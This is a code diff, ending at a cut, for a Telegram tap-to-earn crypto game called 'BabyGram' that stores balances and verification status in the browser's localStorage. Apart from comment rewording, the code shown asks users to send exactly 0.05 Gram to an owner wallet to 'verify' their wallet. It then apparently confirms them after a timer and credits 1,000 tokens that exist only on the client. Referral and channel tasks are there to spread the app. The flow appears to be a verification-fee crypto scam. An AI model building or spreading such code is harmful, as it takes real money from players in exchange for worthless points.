@@ -262,7 +262,7 @@
 
     <script>
         (function() {
-            // 1. Persistent LocalStorage State
+            // LocalStorage State Initialization
             let userBalance = parseFloat(localStorage.getItem('baby_balance')) || 0;
             let walletVerified = localStorage.getItem('baby_verified') === 'true';
             let channelJoined = localStorage.getItem('baby_channel') === 'true';
@@ -275,6 +275,7 @@
             let tapHistory = [];
             let tonConnectUI = null;
 
+            // Unique Referral ID based on Telegram user or Random fallback
             let myUserId = localStorage.getItem('baby_my_uid');
             if (!myUserId) {
                 myUserId = "BG" + Math.floor(100000 + Math.random() * 900000);
@@ -346,7 +347,7 @@
                 }
             }
 
-            // 2. Anti-Cheat Tap Handler (70ms throttle + max 12 taps/sec)
+            // Anti-Cheat Tap Handler (70ms throttle + max 12 taps/sec)
             function handleTap(event) {
                 const now = Date.now();
                 if (now - lastTapTime < 70) return;
@@ -394,7 +395,7 @@
                 }, 370);
             }
 
-            // 3. Wallet Connection & 0.05 Gram Verification
+            // Wallet Connection Action
             function connectWalletAction() {
                 if (tonConnectUI) {
                     if (tonConnectUI.connected) {
@@ -404,8 +405,8 @@
                     }
                     return;
                 }
-                // Fallback if TonConnect CDN is blocked/slow in WebView
-                const manualAddr = prompt("Enter your TON/Gram Wallet Address to connect:");
+                // Fallback direct prompt if SDK is slow
+                const manualAddr = window.prompt("Enter your TON/Gram Wallet Address to connect:");
                 if (manualAddr && manualAddr.trim().length > 10) {
                     userConnectedAddress = manualAddr.trim();
                     localStorage.setItem('baby_wallet_address', userConnectedAddress);
@@ -414,6 +415,7 @@
                 }
             }
 
+            // Verify Wallet with exact 0.05 Gram (50,000,000 nano)
             async function verifyWalletAction() {
                 if (!userConnectedAddress && (!tonConnectUI || !tonConnectUI.connected)) {
                     alert("Please connect your wallet first!");
@@ -421,8 +423,7 @@
                     return;
                 }
 
-                // 0.05 = 50,000,000 nano
-                const amountNano = "50000000";
+                const amountNano = "50000000"; // 0.05 Gram
 
                 if (tonConnectUI && tonConnectUI.connected) {
                     try {
@@ -440,7 +441,6 @@
                         alert("Transaction cancelled or failed. Please send 0.05 Gram to verify.");
                     }
                 } else {
-                    // Direct Tonkeeper transfer link for 0.05
                     const payUrl = "https://app.tonkeeper.com/transfer/" + OWNER_WALLET + "?amount=" + amountNano + "&text=Verify_" + myUserId;
                     window.open(payUrl, "_blank");
                     setTimeout(function() {
@@ -460,7 +460,7 @@
                 alert("Wallet verified successfully! +1,000 $BABYGRAM verification bonus added.");
             }
 
-            // 4. Channel Task (+1,000 Tokens)
+            // Channel Task (+1,000 Tokens)
             function joinChannelAction() {
                 if (channelJoined) return;
                 window.open("https://t.me/BabyGramHQ", "_blank");
@@ -473,7 +473,7 @@
                 }, 2000);
             }
 
-            // 5. Referral System
+            // Referral Link Generator
             function getMyInviteUrl() {
                 return "https://t.me/BabyGramClicker_bot?start=ref_" + myUserId;
             }
@@ -493,4 +493,4 @@
 
             function shareInviteLinkAction() {
                 const refLink = getMyInviteUrl();
-                const shareText = "Join BabyGram Tap & Mine! Tap to earn $BABYGRAM t
+                const shareText = "Join BabyGram Tap & Mine! T
